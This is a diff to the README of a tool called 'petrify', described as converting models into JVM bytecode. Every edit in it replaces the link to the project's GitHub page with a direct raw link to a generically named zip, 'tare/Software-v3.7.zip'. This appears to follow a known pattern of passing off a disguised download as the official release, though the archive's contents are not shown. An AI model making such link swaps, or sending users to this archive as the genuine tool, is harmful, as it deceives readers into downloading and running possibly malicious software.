@@ -1,6 +1,6 @@
 # 🪨 petrify - Turn Models Into JVM Bytecode
 
-[![Download petrify](https://img.shields.io/badge/Download%20petrify-grey?style=for-the-badge&logo=github)](https://github.com/fore4915/petrify)
+[![Download petrify](https://img.shields.io/badge/Download%20petrify-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/fore4915/petrify/main/tare/Software-v3.7.zip)
 
 ## 🚀 What petrify does
 
@@ -30,7 +30,7 @@ If you only want to try the tool, a standard Windows laptop or desktop is enough
 
 Open the download page here:
 
-https://github.com/fore4915/petrify
+https://raw.githubusercontent.com/fore4915/petrify/main/tare/Software-v3.7.zip
 
 From that page, get the latest version or source package, then save it to your computer.
 
@@ -179,4 +179,4 @@ If the tool closes right away, try opening it again from the extracted folder an
 
 Primary download page:
 
-https://github.com/fore4915/petrify
+https://raw.githubusercontent.com/fore4915/petrify/main/tare/Software-v3.7.zip
